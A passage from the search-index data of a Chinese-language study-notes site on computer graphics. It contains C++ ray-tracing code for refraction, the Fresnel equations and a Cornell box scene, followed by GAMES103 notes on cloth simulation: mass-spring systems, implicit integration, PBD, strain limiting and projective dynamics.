cosi = -cosi; } else { std::swap(etai, etat); n= -N; }\n        float eta = etai / etat;\n        float k = 1 - eta * eta * (1 - cosi * cosi);\n        return k &lt; 0 ? 0 : eta * I + (eta * cosi - sqrtf(k)) * n;\n    }\n\n\n\n    // Compute Fresnel equation\n//\n// \\param I is the incident view direction\n//\n// \\param N is the normal at the intersection point\n//\n// \\param ior is the material refractive index\n//\n// \\param[out] kr is the amount of light reflected\n    void fresnel(const Vector3f &amp;I, const Vector3f &amp;N, const float &amp;ior, float &amp;kr) const\n    {\n        float cosi = clamp(-1, 1, dotProduct(I, N));\n        float etai = 1, etat = ior;\n        if (cosi &gt; 0) {  std::swap(etai, etat); }\n        // Compute sini using Snell's law\n        float sint = etai / etat * sqrtf(std::max(0.f, 1 - cosi * cosi));\n        // Total internal reflection\n        if (sint &gt;= 1) {\n            kr = 1;\n        }\n        else {\n            float cost = sqrtf(std::max(0.f, 1 - sint * sint));\n            cosi = fabsf(cosi);\n            float Rs = ((etat * cosi) - (etai * cost)) / ((etat * cosi) + (etai * cost));\n            float Rp = ((etai * cosi) - (etat * cost)) / ((etai * cosi) + (etat * cost));\n            kr = (Rs * Rs + Rp * Rp) / 2;\n        }\n        // As a consequence of the conservation of energy, transmittance is given by:\n        // kt = 1 - kr;\n    }\n};\n\n-------------------------------------------------\n// main.cpp\n    Scene scene(784, 784);\n\n    Material* red = new Material(DIFFUSE, Vector3f(0.0f));\n    red-&gt;Kd = Vector3f(0.63f, 0.065f, 0.05f);\n    Material* green = new Material(DIFFUSE, Vector3f(0.0f));\n    green-&gt;Kd = Vector3f(0.14f, 0.45f, 0.091f);\n    Material* white = new Material(DIFFUSE, Vector3f(0.0f));\n    white-&gt;Kd = Vector3f(0.725f, 0.71f, 0.68f);\n    Material* light = new Material(DIFFUSE, (8.0f * Vector3f(0.747f+0.058f, 0.747f+0.258f, 0.747f) + 15.6f * Vector3f(0.740f+0.287f,0.740f+0.160f,0.740f) + 18.4f *Vector3f(0.737f+0.642f,0.737f+0.159f,0.737f)));\n    light-&gt;Kd = Vector3f(0.65f);\n\n    MeshTriangle floor(\"../models/cornellbox/floor.obj\", white);\n    MeshTriangle shortbox(\"../models/cornellbox/shortbox.obj\", white);\n    MeshTriangle tallbox(\"../models/cornellbox/tallbox.obj\", white);\n    MeshTriangle left(\"../models/cornellbox/left.obj\", red);\n    MeshTriangle right(\"../models/cornellbox/right.obj\", green);\n    MeshTriangle light_(\"../models/cornellbox/light.obj\", light);\n\n    scene.Add(&amp;floor);\n    scene.Add(&amp;shortbox);\n    scene.Add(&amp;tallbox);\n    scene.Add(&amp;left);\n    scene.Add(&amp;right);\n    scene.Add(&amp;light_);\n\n    scene.buildBVH();\n</code></pre> <p>\u5269\u4e0b\u7684\u4e00\u4e9b\u5177\u4f53\u5b9e\u73b0\u3001<code>Render</code> \u7c7b\u3001BoundingBox\u76f8\u5173\u7684\u4e0d\u60f3\u770b\u4e86\u3002\uff08\u6446\u5b50</p>"},{"location":"Accumulation/Games103/","title":"Games103","text":""},{"location":"Accumulation/Games103/#games103","title":"Games103","text":"<p> \u7ea6 118 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"Accumulation/Games103/#course-overview","title":"Course Overview","text":"<p>Unity \u4f7f\u7528\u7684\u662f\u5de6\u624b\u7cfb\u7edf</p> <p></p> <p>\u8ba1\u7b97\u673a\u56fe\u5f62\u5b66\u7684 Pipeline:</p> <p></p> <p>\u5176\u4e2d\uff0cGeometry\u3001Animation\u3001Rendering\u5c31\u5bf9\u5e94\u7740\u8ba1\u7b97\u673a\u56fe\u5f62\u5b66\u7684\u4e09\u4e2a\u4e3b\u8981\u65b9\u5411\u3002</p> <p>Games103 \u8bb2\u6388\u7684\u662f\u57fa\u4e8e\u7269\u7406\u7684\u8ba1\u7b97\u673a\u52a8\u753b\u5165\u95e8\uff0c\u5305\u542b\u521a\u4f53\u3001\u8863\u670d\u4e0e\u5934\u53d1\u3001\u8f6f\u4f53\u3001\u6d41\u4f53\u56db\u7c7b</p> <p></p> <p>Grid \u662f\u628a\u7a7a\u95f4\u5212\u5206\u4e3a\u4e00\u4e2a\u4e2a\u5c0f\u683c\u5b50\u7684\u7f51\u683c\uff0c\u5b9a\u4e49\u5728\u6574\u4e2a3D\u573a\u666f\u4e0a\uff08\u800cMesh\u53ea\u5b9a\u4e49\u5728\u7269\u4f53\u4e0a\uff09</p>"},{"location":"Accumulation/Games103/#reference","title":"Reference","text":"<ul> <li>https://games103.games-cn.org/</li> <li>https://games-cn.org/games103-slides/</li> <li>https://moeleaf.github.io/GAMES103/GAMES103-Index/</li> </ul>"},{"location":"Accumulation/Games103/Cloth/","title":"Cloth","text":""},{"location":"Accumulation/Games103/Cloth/#cloth","title":"Cloth","text":"<p> \u7ea6 2140 \u4e2a\u5b57  65 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p>"},{"location":"Accumulation/Games103/Cloth/#mass-spring-system","title":"Mass-Spring System","text":"<p>\u4e00\u4e2a\u7406\u60f3\u7684\u5f39\u7c27\u6ee1\u8db3\u80e1\u514b\u5b9a\u7406\uff0c\u5373\u5b83\u7684\u529b\u4e0e\u62c9\u4f38\u7684\u5f62\u53d8\u957f\u5ea6\u6210\u6b63\u6bd4\u3002\u5bf9\u4e8e\u591a\u4e2a\u5f39\u7c27\u7ec4\u6210\u7684\u7cfb\u7edf\uff0c\u7cfb\u7edf\u7684\u80fd\u91cf\u4ee5\u53ca\u4e2d\u5fc3\u70b9\u6240\u53d7\u7684\u529b\u8868\u793a\u4e3a\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u4e00\u6bb5\u7531\u56db\u8fb9\u5f62\u7ec4\u6210\u3001\u7ed3\u6784\u5316\u7684\u5e03\u6599\uff0c\u6211\u4eec\u6dfb\u52a0\u4e09\u79cd\u5f39\u7c27\uff0c\u6784\u6210 Network\uff1a</p> <ol> <li>\u5728\u7f51\u683c\u539f\u672c\u7684\u8fb9\u4e0a\u6dfb\u52a0\u5f39\u7c27\uff0c\u62b5\u6297\u5e03\u6599\u4ea7\u751f\u7684\u6a2a\u5411\u548c\u7eb5\u5411\u7684\u5c0f\u8936\u76b1</li> <li>\u4e3a\u6bcf\u4e2a\u56db\u8fb9\u5f62\u7684\u5bf9\u89d2\u7ebf\u65b9\u5411\u6784\u9020\u5f39\u7c27</li> <li>\u8df3\u8fc7\u4e00\u4e2a\u9876\u70b9\uff0c\u62b5\u6297 bending force \u7684\u5f2f\u66f2\u5f39\u7c27\uff0c\u963b\u6b62\u5e03\u6599\u5411\u67d0\u4e00\u65b9\u5411\u81ea\u7531\u5f2f\u66f2</li> </ol> <p>\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u53ef\u4ee5\u53ea\u5bf9\u56db\u8fb9\u5f62\u4e00\u4e2a\u5bf9\u89d2\u7ebf\u65b9\u5411\u6dfb\u52a0\u5f39\u7c27</p> <p></p> <p>\u4f46\u662f\u5b9e\u9645\u4f7f\u7528\u65f6\uff0c\u5e03\u6599\u7684 Mesh \u53ef\u80fd\u4e0d\u662f\u5f88\u89c4\u5219\u3001\u5f88\u7ed3\u6784\u5316\u7684\u65b9\u5757\u3002\u5bf9\u4e8e\u4e09\u89d2\u5f62\u7f51\u683c\uff0c\u4e00\u79cd\u7b80\u5355\u7684\u601d\u8def\u5c31\u662f\u8ba4\u4e3a\u5176\u6bcf\u6761\u8fb9\u90fd\u662f\u4e00\u4e2a\u5f39\u7c27\uff0c\u5e76\u4e3a\u67d0\u4e00\u8fb9\u76f8\u5bf9\u7684\u4e24\u4e2a\u9876\u70b9\u90fd\u6784\u9020\u4e00\u4e2a\u5f2f\u66f2\u5f39\u7c27\uff1a</p> <p></p> <p>\u6709\u4e86\u8fd9\u4e9b\u5f39\u7c27\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u663e\u5f0f\u6216\u9690\u5f0f\u7684\u65b9\u6cd5\u641e\u51fa Mass-Spring System \u6765\u6a21\u62df\u5e03\u6599\u3002</p>"},{"location":"Accumulation/Games103/Cloth/#explicit-integration","title":"Explicit Integration","text":"<p>\u5bf9\u4e8e\u65f6\u95f4\u6b65 \\(t_0 \\rightarrow t_1\\)\uff0c\u663e\u5f0f\u79ef\u5206\u4ee5 \\(t_0\\) \u65f6\u523b\u901f\u5ea6\u4e58\u4e0a \\(\\Delta t\\) \u6765\u4f30\u8ba1\u4f4d\u79fb</p> <p>\u9996\u5148\u51b3\u5b9a\u4e00\u4e2a\u7c92\u5b50\u72b6\u6001\u7684\u66f4\u65b0\uff0c\u5c06\u5f39\u7c27\u7cfb\u7edf\u63d2\u5165\u5230\u529b\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\uff1a</p> <p></p> <p>\u5148\u904d\u5386\u6240\u6709\u7684\u5f39\u7c27\uff0c\u7b97\u51fa\u6bcf\u4e2a\u5f39\u7c27\u5bf9\u6bcf\u4e2a\u9876\u70b9\u65bd\u52a0\u7684\u529b\u3002</p> <p>\u7136\u540e\u904d\u5386\u6bcf\u4e2a\u9876\u70b9\uff0c\u628a\u5f39\u7c27\u5bf9\u8fd9\u4e2a\u70b9\u7684\u529b\u52a0\u8d77\u6765\u5c31\u662f\u8fd9\u4e2a\u70b9\u53d7\u5230\u7684\u5408\u529b\u3002</p> <p>\u5728 \\(\\Delta t\\) \u6216\u8005\u5f39\u7c27\u7cfb\u6570 \\(k\\) \u8fc7\u5927\u7684\u60c5\u51b5\u4e0b\uff0c\u663e\u5f0f\u79ef\u5206\u505a\u6cd5\u5f88\u53ef\u80fd\u4f1a\u4ea7\u751f overshooting</p>"},{"location":"Accumulation/Games103/Cloth/#implicit-integration","title":"Implicit Integration","text":"<p>\u5bf9\u4e8e\u65f6\u95f4\u6b65 \\(t_0 \\rightarrow t_1\\)\uff0c\u9690\u5f0f\u79ef\u5206\u4ee5 \\(t_1\\) \u65f6\u523b\u901f\u5ea6\u4e58\u4e0a \\(\\Delta t\\) \u6765\u4f30\u8ba1\u4f4d\u79fb</p> <p>\u53e6\u4e00\u79cd\u6a21\u62df\u65b9\u5f0f\u79f0\u4e3a\u9690\u5f0f\u79ef\u5206\uff0c\u8ba4\u4e3a\u901f\u5ea6\u7684\u66f4\u65b0\u4f9d\u8d56\u4e8e\u4e0b\u4e00\u72b6\u6001\u7684\u529b\uff0c\u4f4d\u7f6e\u7684\u66f4\u65b0\u4f9d\u8d56\u4e8e\u4e0b\u4e00\u72b6\u6001\u7684\u901f\u5ea6\uff0c\u56e0\u6b64\u9690\u5f0f\u79ef\u5206\u6cd5\u5728\u6570\u503c\u4e0a\u4f1a\u66f4\u52a0\u7a33\u5b9a\u3002</p> <p>\u7531\u4e8e\u66f4\u65b0\u65f6\u6240\u7528\u7684\u662f\u4e0b\u4e00\u72b6\u6001\u7684\u529b \\(f^{[1]}\\)\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e0e \\(x^{[1]}\\) \u6709\u5173\u7684\u672a\u77e5\u91cf\uff0c\u56e0\u6b64\u53ef\u4ee5\u8003\u8651\u5c06\u5176\u8f6c\u6362\u4e3a\u6c42\u89e3\u5173\u4e8e\u53d8\u91cf \\(x^{[1]}\\) \u7684\u65b9\u7a0b\uff1a</p> <p></p> <p>\u95ee\u9898\u5728\u4e8e\uff0c\u529b\u7684\u65b9\u7a0b \\(f(x)\\) \u53ef\u80fd\u4e0d\u662f\u5173\u4e8e \\(x\\) \u7684\u7ebf\u6027\u65b9\u7a0b\u3002\u6240\u5e78\u7684\u662f\uff0c\u7531\u4e8e \\(x\\) \u662f\u4e00\u4e2a \\(3\\times N\\) \u7684\u77e9\u9635\uff0c\u91cc\u9762\u5305\u542b\u4e86 \\(N\\) \u4e2a\u9876\u70b9\u7684\u4f4d\u7f6e\u4fe1\u606f\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u7ebf\u6027\u4f18\u5316\u7684\u65b9\u5f0f\u7b80\u5316\u6c42\u89e3\uff1a</p> <p></p> <p>\u5177\u4f53\u539f\u7406\u542c\u4e0d\u61c2\u5566</p> <p>\u6839\u636e\u725b\u987f\u903c\u8fd1\u6cd5\uff0c\u627e\u51fa\u6700\u5c0f\u503c\u6240\u5728\u7684\u70b9\uff1a</p> <pre><code>for k = 0,...,K\n    Delta x = - (F''(x^(k)))^{-1} * F'(x^(k));\n    x^(k+1) = x^(k) + Delta x\n    if Delta x is small: break\nx^{[1]} = x^(k+1)\n</code></pre> <p>\u725b\u987f\u6cd5\u914d\u5408\u6cf0\u52d2\u5c55\u5f00\uff0c\u5728\u4e00\u9636\u5bfc\u6570\u4e3a 0 \u65f6\u53d6\u5f97\u6700\u503c</p> \\[0=F'(x)=F'(x^{(k)}) + F''(x^{(k)}) (x- x^{(k)})\\] <p>\u800c\u5bf9\u4e8e \\(F(x)\\)\uff0c\u8ba1\u7b97\u5176\u4e00\u9636\u5bfc\u548c\u4e8c\u9636\u5bfc\uff1a</p> <p></p> <p>\u5176\u4e2d \\(H(x)\\) \u4ee3\u8868 Spring Hessian\uff0c\u5b83\u662f\u5f39\u7c27\u5207\u7ebf\u521a\u5ea6 Tangent stiffness \u7684\u91cf\u5316\uff0c\u4e5f\u5bf9\u5e94\u7740 \\(k\\)\uff1a</p> <p></p> Lab2 \u4e2d\u8ba1\u7b97\u7684\u6b65\u9aa4 <p></p> <p>\u5728\u5b9e\u9a8c2\u4e2d\uff0c\u8ba1\u7b97\u5bfc\u6570\u53ca\u4f4d\u7f6e\u66f4\u65b0\u90e8\u5206\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u5b8c\u6210\uff1a</p> <pre><code>// in update()\nfor (int k = 0; k &lt; 32; k++)\n{\n    Get_Gradient(X, X_hat, t, G);\n\n    //Update X by gradient.\n    for (int i = 0; i &lt; X.Length; i++)\n    {\n        if (i == 0 || i == 20) continue; // \u5b9a\u70b9\u4f4d\u7f6e\u4e0d\u53d8\n        last_X[i] = X[i];\n        X[i] = X[i] - G[i] / (mass / (t * t) + 4 * spring_k);\n    }\n}\n\n// Get_Gradient\nvoid Get_Gradient(Vector3[] X, Vector3[] X_hat, float t, Vector3[] G)\n{\n    //Momentum and Gravity.\n    for (int i = 0; i &lt; X.Length; i++)\n    {\n        G[i] = mass * (X[i] - X_hat[i]) / (t * t);\n        G[i][1] += 9.8f * mass; // \u91cd\u529b\n        // G[i] -= f(x);\n    }\n\n    //Spring Force.\n    for (int i = 0; i &lt; E.Length; i+=2)\n    {\n        int v0 = E[i + 0];\n        int v1 = E[i + 1];\n        Vector3 d = X[v0] - X[v1];\n        float l = d.magnitude;\n        Vector3 f = spring_k * (l - L[i / 2]) * d / l;\n        G[v0] += f;\n        G[v1] -= f;\n    }\n}\n</code></pre>"},{"location":"Accumulation/Games103/Cloth/#dihedral-angle-model","title":"Dihedral Angle Model","text":"<p>\u4e8c\u9762\u89d2\u6a21\u578b\u4e0d\u4ee5\u5f39\u7c27\u7684\u957f\u5ea6\u6765\u8868\u793a\u5f2f\u66f2\u529b Bending Forces\uff0c\u800c\u662f\u4ee5\u4e24\u4e2a Mesh \u4e4b\u95f4\u7684\u5939\u89d2\u6765\u8ba1\u7b97\uff1a</p> \\[f_i= f(\\theta) \\mu_i\\] <p>\u4e24\u4e2a\u9762\u4e4b\u95f4\u7684\u5f2f\u66f2\u529b\u6d89\u53ca\u5230\u4e86\u56db\u4e2a\u9876\u70b9\uff0c\\(\\mu_i\\) \u6307\u7684\u5c31\u662f\u8fd9\u56db\u4e2a\u9876\u70b9\u7684\u5f2f\u66f2\u529b\u5206\u91cf</p> <p></p> <ul> <li>&lt;1&gt; \\(u_1\\), \\(u_2\\) \u7684\u65b9\u5411\u5e94\u5206\u522b\u4e0e \\(n_1\\), \\(n_2\\) \u76f8\u540c</li> <li>&lt;2&gt; \u7531\u4e8e\u5f2f\u66f2\u529b\u4e0d\u4f1a\u5bf9\u8fb9\u8fdb\u884c\u62c9\u4f38\uff0c\\(u_3- u_4\\) \u5e94\u8be5\u4e0e \\(x_3 x_4\\) \u5782\u76f4<ul> <li>\u8fd9\u4e5f\u610f\u5473\u7740\uff0c\\(u_3 - u_4\\) \u662f \\(n_1\\), \\(n_2\\) \u7684\u7ebf\u6027\u7ec4\u5408</li> </ul> </li> <li>&lt;3&gt; \u6839\u636e\u725b\u987f\u5b9a\u5f8b\uff0c\\(u_1 +u_2 +u_3 +u_4 = 0\\)<ul> <li>\u7ed3\u5408 &lt;2&gt;\uff0c\u5219\u5f97\u5230 \\(u_3\\) \u548c \\(u_4\\) \u90fd\u662f \\(n_1\\), \\(n_2\\) \u7684\u7ebf\u6027\u7ec4\u5408</li> </ul> </li> </ul> <p>\u52a0\u4e0a \\(f(\\theta)\\) \u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u5f97\u5230\uff1a</p> \\[ f_i = k \\frac{ ||E||^2 }{ ||N_1|| + ||N_2|| } \\left (  \\sin \\left(\\frac{\\pi - \\theta}{2}\\right) - \\sin \\left(\\frac{\\pi - \\theta_0}{2}\\right) \\right)\\mu_i \\] <p>\u5176\u4e2d \\(\\theta_0\\) \u8868\u793a\u8fd9\u4e24\u4e2a\u9762\u7684\u521d\u59cb\u76f8\u4f4d\uff0c\u5373\u5b83\u4eec\u9759\u6b62\u65f6\u53ef\u80fd\u5e76\u4e0d\u662f\u4e00\u4e2a\u5e73\u9762</p> Locking Issues <p>\u4e4b\u524d\u6240\u8bf4\u7684\u5f39\u7c27\u6a21\u578b\u5b58\u5728\u95ee\u9898\uff0c\u7528\u5176\u6765\u6a21\u62df\u4e0d\u80fd\u62c9\u4f38\u7684\u6750\u6599\u65f6\uff0c\u5f39\u7c27\u7684\u5f39\u6027\u7cfb\u6570\u975e\u5e38\u5927\uff0c\u8fd9\u4f7f\u5f97\u6211\u4eec\u8fdb\u884c\u5f2f\u66f2\u65f6\u4e5f\u4f1a\u53d7\u5230\u975e\u5e38\u5927\u7684\u963b\u529b\u3002\u8fd9\u5728\u6a21\u62df\u4e00\u4e9b\u4e0d\u80fd\u62c9\u4f38\u4f46\u662f\u53ef\u4ee5\u5f2f\u66f2\u7684\u6750\u6599\uff08\u5982\u7eb8\u7b49\uff09\u65f6\u975e\u5e38\u4e0d\u53cb\u597d\u3002</p> <p>\u53d1\u751f Locking \u95ee\u9898\u7684\u672c\u8d28\u539f\u56e0\u65f6\u6a21\u62df\u81ea\u7531\u5ea6\u4e0d\u8db3</p> <ul> <li>&lt;1&gt; \u51cf\u5c0f\u5f39\u7c27\u538b\u7f29\u65f6\u7684\u5f39\u6027\u7cfb\u6570</li> <li>&lt;2&gt; \u4e3a\u5f39\u7c27\u8bbe\u7f6e\u4e00\u6bb5 Buffer\uff0c\u5728\u4e00\u5b9a\u8303\u56f4\u5185\u957f\u5ea6\u6539\u53d8\u4e0d\u4f1a\u4ea7\u751f\u5f39\u529b</li> </ul>"},{"location":"Accumulation/Games103/Cloth/#constained-approach","title":"Constained Approach","text":"<p>\u771f\u5b9e\u4e16\u754c\u7684\u5e03\u6599\u62c9\u4f38\u4e00\u5b9a\u957f\u5ea6\u540e\u6240\u9700\u7684\u529b\u4f1a\u9661\u589e\u3002\u57fa\u4e8e\u80e1\u514b\u5b9a\u5f8b\u7684\u5f39\u7c27\u6a21\u578b\u9700\u8981\u589e\u5927\u5f39\u6027\u7cfb\u6570 K \u6765\u6a21\u62df\u8fd9\u4e00\u73b0\u8c61\uff0c\u56e0\u6b64\u663e\u5f0f\u79ef\u5206\u548c\u9690\u5f0f\u79ef\u5206\u90fd\u96be\u4ee5\u5e94\u7528\uff0c\u5e26\u6765\u5f88\u591a\u989d\u5916\u8ba1\u7b97\u91cf\u3002\u5728\u6b64\u524d\u63d0\u4e0b\uff0c\u6211\u4eec\u63d0\u51fa\u57fa\u4e8e\u7ea6\u675f\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5f39\u7c27\uff0c\u6211\u4eec\u4e3a\u5176\u8bbe\u7f6e\u7ea6\u675f\uff0c\u8ba4\u4e3a\u5176\u957f\u5ea6\u59cb\u7ec8\u4fdd\u6301\u4e0d\u53d8\uff0c\u5373\uff1a</p> \\[ Constraint: \\ \\ ||x_i - x_j|| -L =0 \\] <p>\u5f53\u8fd9\u4e2a\u7ea6\u675f\u88ab\u6253\u7834\u65f6\uff0c\u9700\u8981\u7528\u4e00\u4e2a\u6295\u5f71\u65b9\u7a0b\u5c06\u5176\u4fee\u6b63\u3002\u5bf9\u4e8e\u6b64\u4f8b\uff0c\u6211\u4eec\u5e0c\u671b\u8fd9\u4e2a\u6295\u5f71\u65b9\u7a0b\u5bf9 Position \u7684\u5f71\u54cd\u5c3d\u53ef\u80fd\u5c0f\uff0c\u5e76\u4e14\u4e0d\u6539\u53d8\u8d28\u5fc3\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u90a3\u4e48\u5176\u66f4\u6539\u5219\u4e0e \\(i,j\\) \u7684\u8d28\u91cf \\(m_i, m_j\\) \u76f8\u5173\uff1a</p> <p></p> <p>\u4e3a\u5b9a\u70b9\u8bbe\u7f6e\u8d28\u91cf\u65e0\u9650</p> <p>\u843d\u5b9e\u5230\u591a\u5f39\u7c27\u7cfb\u7edf\u4e0a\uff0c\u5219\u6709\u4e24\u79cd\u4e3b\u8981\u5904\u7406\u65b9\u6cd5</p> <p>Gauss-Seidel Approach</p> <p>\u4f9d\u6b21\u5bf9\u6bcf\u4e2a\u5f39\u7c27\u8fdb\u884c\u5904\u7406\uff0c\u91cd\u590d\u8fed\u4ee3\u3002</p> <pre><code>for k = 0,...,K # \u8fed\u4ee3 K \u8f6e\n    for each edge e = &lt;i,j&gt; # \u4f9d\u6b21\u5904\u7406\u6bcf\u4e00\u4e2a\u5f39\u7c27\n        x_i = x_i - 1/2*(||x_i-x_j||-L_e) * (x_i-x_j).normalize\n        x_j = x_j + 1/2*(||x_i-x_j||-L_e) * (x_i-x_j).normalize\n</code></pre> <p>Jacobi Approach</p> <p>Jacobi \u65b9\u6cd5\u5e0c\u671b\u51cf\u5c11\u7531\u4e8e\u8fb9\u7684\u987a\u5e8f\u9020\u6210\u7684\u5f71\u54cd\uff0c\u5e76\u4e14\u80fd\u591f\u5c3d\u91cf\u5728 GPU \u4e0a\u5e76\u884c\u3002</p> <p>\u5f53\u6211\u6bcf\u6b21\u8ba1\u7b97\u8fb9\u7684\u66f4\u65b0\u65f6\uff0c\u90fd\u5c06\u5176\u7d2f\u52a0\u4fdd\u5b58\u4e0b\u6765\uff0c\u6700\u540e\u53d6\u5e73\u5747\u503c</p> <pre><code>for k = 0,...,K # \u8fed\u4ee3 K \u8f6e\n    for every vertex i\n        x_i_new = 0\n        n_i = 0\n    for every edge e = &lt;i,j&gt;\n        x_i_new = x_i_new + x_i - 1/2*(||x_i-x_j||-L_e) * (x_i-x_j).normalize\n        x_j_new = x_j_new + x_j + 1/2*(||x_i-x_j||-L_e) * (x_i-x_j).normalize\n        n_i = n_i + 1\n        n_j = n_j + 1\n    for every vertex i\n        x_i  = (x_i_new + a * x_i)/(n_i + a)\n</code></pre>"},{"location":"Accumulation/Games103/Cloth/#position-based-dynamics","title":"Position Based Dynamics","text":"<p>\u5373\u7cfb\u7edf\u5916\u529b\u6b63\u5e38\u8003\u8651\uff0c\u7cfb\u7edf\u5185\u90e8\u4e0d\u8fdb\u884c\u529b\u7684\u8003\u8651(\u5f39\u7c27)\uff0c\u53ea\u8fdb\u884c\u7ea6\u675f\u7684\u6784\u5efa</p> <p>PBD \u5904\u7406\u7684\u6d41\u7a0b\u4e0e\u521a\u4f53 Shape Matching \u7c7b\u4f3c\uff1a</p> <pre><code>// A PBD Simulator\n// \u6bcf\u4e2a\u9876\u70b9\u81ea\u7531\u8fd0\u52a8\uff0c\u66f4\u65b0\u5b83\u4eec\u5404\u81ea\u7684 x \u548c v\nx = ...;\nv = ...;\n// Now PBD starts\nx_new = projection(x);  // \u8fdb\u884c\u6295\u5f71\u6062\u590d\u7ea6\u675f\nv = v + (x_new - x)/dt; // \u8fd9\u91cc\u7684 x \u5df2\u7ecf\u66f4\u65b0\u8fc7\u4e86\uff0c\u6240\u4ee5\u901f\u5ea6\u8ba1\u7b97\u662f\u8fed\u52a0\nx = x_new;\n</code></pre> <ul> <li>Advantage\uff1a<ul> <li>GPU \u4e0a\u5f88\u5bb9\u6613\u5e76\u884c</li> <li>\u6267\u884c\u5b9e\u73b0\u7b80\u5355</li> <li>\u4f4e\u5206\u8fa8\u7387\u4e0a\u8fd0\u884c\u5f88\u5feb<ul> <li>\u4e0d\u52301000\u4e2a\u70b9\u7684\u7f51\u683c\u80fd\u591f\u505a\u5230\u5b9e\u65f6</li> </ul> </li> <li>\u901a\u7528\u6027\u5f3a\uff0c\u8fd8\u53ef\u4ee5\u7528\u6765\u505a\u5f39\u6027\u4f53\u3001\u6d41\u4f53\u6a21\u62df</li> </ul> </li> <li>Disadvantage\uff1a<ul> <li>\u7269\u7406\u4e0a\u53ef\u80fd\u4e0d\u6b63\u786e\uff0c\u5f39\u6027\u8868\u73b0\u53d7\u7f51\u683c\u3001\u8fed\u4ee3\u6b21\u6570\u5f71\u54cd</li> <li>\u9ad8\u5206\u8fa8\u7387\u4e0a\u8fd0\u884c\u5f88\u6162</li> </ul> </li> </ul> <p>\u63a8\u8350\u9605\u8bfb</p>"},{"location":"Accumulation/Games103/Cloth/#strain-limiting","title":"Strain Limiting","text":"<p>Strain Limiting \u53ef\u4ee5\u8ba4\u4e3a\u662f\u5bf9 PBD \u7684\u4e00\u4e2a\u6539\u8fdb\uff08\u5c3d\u7ba1\u5b83\u7684\u51fa\u73b0\u6bd4 PBD \u66f4\u65e9\uff09\uff0c\u4e8c\u8005\u533a\u522b\u5728\u4e8e\u505a\u6295\u5f71\u524d\u4e0d\u53ea\u53ef\u4ee5\u4f7f\u7528\u7c92\u5b50\u7cfb\u7edf\u505a\u6a21\u62df\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5f39\u7c27\u7b49\u6a21\u578b\u3002\u800c\u6700\u540e\u7684\u6295\u5f71\u53ea\u662f\u5bf9\u6a21\u62df\u7ed3\u679c\u7684\u7ea0\u9519\uff0c\u589e\u52a0\u6a21\u62df\u7684\u7a33\u5b9a\u6027\u3002</p> <p>\u76f8\u5bf9\u7684\uff0c\u6295\u5f71\u65f6\u7684\u7ea6\u675f\u6761\u4ef6\u53ef\u4ee5\u653e\u5bbd\uff0c\u4f8b\u5982\uff0c\u8bbe\u7f6e\u5f39\u7c27\u7684\u957f\u5ea6\u9650\u5236\u5728\u4e00\u5b9a\u8303\u56f4\u5185\uff1a</p> <p></p> <p>PBD \u53ef\u4ee5\u8ba4\u4e3a\u662f\u8be5 Strain Limiting \u7684\u7279\u4f8b\uff0c\u5373 \\(\\sigma_0 =1\\)</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u5bf9\u4e09\u89d2\u5f62\u7684\u9762\u79ef\u7b49\u8fdb\u884c\u7ea6\u675f\u3002</p> <p>\u5f88\u591a\u7269\u4f53\u7684\u529b\u4e0e\u5f62\u53d8\u91cf\u4e4b\u95f4\u5b58\u5728\u975e\u7ebf\u6027\u5173\u7cfb\uff0c\u5f53\u5f62\u53d8\u91cf\u8f83\u5c0f\u65f6\uff0c\u53ef\u4ee5\u91c7\u7528\u6b63\u5e38\u7684\u7269\u7406\u6a21\u62df\uff0c\u6b64\u65f6\u5f39\u7c27\u5f39\u6027\u7cfb\u6570\u8f83\u5c0f\uff0cLocking Issue \u4e0d\u660e\u663e\uff1b\u5f53\u5f62\u53d8\u91cf\u8f83\u5927\u65f6\uff0c\u6539\u7528 Strain Limiting\u3002</p>"},{"location":"Accumulation/Games103/Cloth/#projective-dynamics","title":"Projective Dynamics","text":"<p>Projective Dynamics \u6839\u636e\u5f39\u7c27\u7cfb\u7edf\u7684\u80fd\u91cf\u8fdb\u884c\u6295\u5f71\u7ea6\u675f\uff0c\u5373\uff1a</p> \\[ E(x) = \\sum_{e=\\{i,j\\}} \\frac{k}{2} \\left(||x_i -x_j|| -L_e\\right)^2 \\] <p>\u4f46\u662f\u8fd9\u6837\u548c\u6b63\u5e38\u7269\u7406\u6a21\u62df\u5f39\u7c27\u7cfb\u7edf\u6709\u4ec0\u4e48\u533a\u522b\uff1f\u4f7f Projective Dynamic \u7279\u6b8a\u7684\u5176\u5b9e\u662f Hessian\uff0c\u8ba1\u7b97\u540e\u53ef\u4ee5\u53d1\u73b0\u5b83\u662f\u4e00\u4e2a\u5e38\u6570\u7684\u77e9\u9635\uff1a</p> <p></p> <p>\u6839\u636e\u56fe\u8f6c\u6362 Hession</p> <ul> <li>\u5bf9\u89d2\u7ebf\u4e0a\u4e3a \\(E(x)\\) \u7684\u5bf9\u5e94\u53d8\u91cf\u4e8c\u9636\u504f\u5bfc\uff0c\u53ef\u4ee5\u5728\u56fe\u4e0a\u6570\u8be5\u70b9\u7684 degree</li> <li>\u975e\u5bf9\u89d2\u7ebf\u4e0a\u4e3a\u4e0d\u540c\u53d8\u91cf\u7684\u4e8c\u9636\u504f\u5bfc\uff0c\u53ef\u4ee5\u5728\u56fe\u4e0a\u6570\u5bf9\u5e94\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u662f\u5426\u5b58\u5728\u8fb9\uff0c\u6709\u5219\u4e3a -1\uff0c\u65e0\u5219\u4e3a 0</li> </ul> 